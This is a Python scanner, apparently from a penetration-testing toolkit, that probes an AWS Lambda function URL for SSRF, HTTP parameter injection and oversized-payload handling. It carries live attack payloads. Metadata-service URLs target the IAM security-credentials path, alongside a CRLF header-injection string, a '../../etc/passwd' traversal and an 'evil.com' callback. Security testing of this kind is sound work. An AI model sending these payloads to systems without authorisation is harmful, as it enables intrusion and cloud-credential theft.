#!/usr/bin/env python3
"""Lambda function injection tester.

Tests an accessible Lambda function URL for HTTP parameter injection,
SSRF via event payload, and oversized payload handling.
"""

from __future__ import annotations

import argparse
import json
import sys
import logging
import time
from typing import Any

import requests
from protopen_scripts._common import make_headers, make_session

logger = logging.getLogger(__name__)

# SSRF probe payloads targeting cloud metadata services
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
]

# HTTP parameter injection payloads
INJECT_PAYLOADS = [
    {"key": "url", "value": "https://example.com\r\nX-Injected: pwned"},
    {"key": "endpoint", "value": "javascript:alert(1)"},
    {"key": "path", "value": "../../etc/passwd"},
    {"key": "callback", "value": "evil.com"},
]


def _send_payload(session: requests.Session, url: str, payload: dict, timeout: int = 15) -> tuple[int, str, float]:
    """Send a JSON payload and return (status_code, response_body, elapsed_ms)."""
    start = time.time()
    try:
        resp = session.post(url, json=payload, timeout=timeout)
        elapsed = (time.time() - start) * 1000
        return resp.status_code, resp.text[:2000], elapsed
    except requests.Timeout:
        elapsed = (time.time() - start) * 1000
        return -1, "TIMEOUT", elapsed
    except requests.RequestException as exc:
        elapsed = (time.time() - start) * 1000
        return -2, str(exc), elapsed


def test_ssrf(session: requests.Session, url: str, event_type: str) -> list[dict[str, Any]]:
    """Test for SSRF via Lambda event payload."""
    findings: list[dict[str, Any]] = []

    for ssrf_url in SSRF_PAYLOADS:
        # Construct event payload based on event type
        if event_type == "api_gateway":
            payload = {"body": json.dumps({"url": ssrf_url}), "httpMethod": "POST"}
        elif event_type == "s3":
            payload = {"Records": [{"s3": {"bucket": {"name": "test"}, "object": {"key": ssrf_url}}}]}
        else:
            payload = {"url": ssrf_url, "endpoint": ssrf_url, "target": ssrf_url}

        status, body, elapsed = _send_payload(session, url, payload)

        # Metadata service responses contain known strings
        metadata_indicators = [
            "ami-id",
            "instance-type",
            "security-credentials",
            "computeMetadata",
            "project-id",
            "accessKeyId",
            "SecretAccessKey",
            "Token",
        ]
        if any(ind in body for ind in metadata_indicators):
            findings.append(
                {
                    "function_url": url,
                    "severity": "critical",
                    "description": f"SSRF via event payload — cloud metadata service responded: {body[:200]}",
                    "payload": ssrf_url,
                    "vulnerability_type": "ssrf",
                }
            )

    return findings


def test_http_injection(session: requests.Session, url: str) -> list[dict[str, Any]]:
    """Test for HTTP parameter injection."""
    findings: list[dict[str, Any]] = []

    for inject in INJECT_PAYLOADS:
        payload = {inject["key"]: inject["value"], "test": True}
        status, body, elapsed = _send_payload(session, url, payload)

        if "X-Injected" in body or "pwned" in body:
            findings.append(
                {
                    "function_url": url,
                    "severity": "high",
                    "description": f"HTTP header injection via '{inject['key']}' parameter — injected header reflected in response",
                    "payload": inject["value"],
                    "vulnerability_type": "http_header_injection",
                }
            )
        elif status == 200 and inject["value"] in body:
            findings.append(
                {
                    "function_url": url,
                    "severity": "medium",
                    "description": f"Injection value reflected in response for parameter '{inject['key']}'",
                    "payload": inject["value"],
                    "vulnerability_type": "reflection",
                }
            )

    return findings


def test_oversized_payload(session: requests.Session, url: str) -> list[dict[str, Any]]:
    """Test Lambda behavior with oversized payloads."""
    findings: list[dict[str, Any]] = []

    # Lambda default payload limit is 6MB (sync) / 256KB (async request)
    # Send a 1MB payload to test handling
    large_payload = {"data": "A" * (1024 * 1024)}
    status, body, elapsed = _send_payload(session, url, large_payload, timeout=30)

    if status == 200:
        findings.append(
            {
                "function_url": url,
                "severity": "low",
                "description": "Lambda accepted 1MB payload without rejection — verify resource limits are appropriate",
                "vulnerability_type": "oversized_payload_accepted",
            }
        )
    elif status == -1:
        findings.append(
            {
                "function_url": url,
                "severity": "low",
                "description": "Lambda timed out on 1MB payload — possible DoS vector via oversized payloads",
                "vulnerability_type": "oversized_payload_timeout",
            }
        )

    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="Lambda function injection tester")
    parser.add_argument("--function-url", required=True, help="Lambda function URL")
    parser.add_argument("--event-type", default="http", help="Event type (http, api_gateway, s3, etc.)")
    parser.add_argument("--output-json", action="store_true", help="Always output JSON (default)")
    args = parser.parse_args()

    result: dict[str, Any] = {"injections": []}

    try:
        session = requests.Session()
        session.headers.update(
            {
                "User-Agent": make_headers()["User-Agent"],
                "Content-Type": "application/json",
            }
        )

        # Probe endpoint liveness first
        try:
            probe = session.get(args.function_url, timeout=10)
            result["status"] = probe.status_code
            result["accessible"] = True
        except requests.RequestException:
            result["accessible"] = False
            result["injections"].append(
                {
                    "function_url": args.function_url,
                    "severity": "info",
                    "description": "Lambda function URL not accessible — skipping injection tests",
                    "vulnerability_type": "unreachable",
                }
            )
            print(json.dumps(result))
            return

        # Run tests
        ssrf_findings = test_ssrf(session, args.function_url, args.event_type)
        result["injections"].extend(ssrf_findings)

        inject_findings = test_http_injection(session, args.function_url)
        result["injections"].extend(inject_findings)

        oversize_findings = test_oversized_payload(session, args.function_url)
        result["injections"].extend(oversize_findings)

        if not result["injections"]:
            result["injections"].append(
                {
                    "function_url": args.function_url,
                    "severity": "info",
                    "description": "No injection vulnerabilities detected in tested payloads",
                    "vulnerability_type": "none_found",
                }
            )

    except Exception as exc:
        result["error"] = str(exc)
        logger.error("lambda_inject error: %s", exc)

    print(json.dumps(result))


if __name__ == "__main__":
    main()
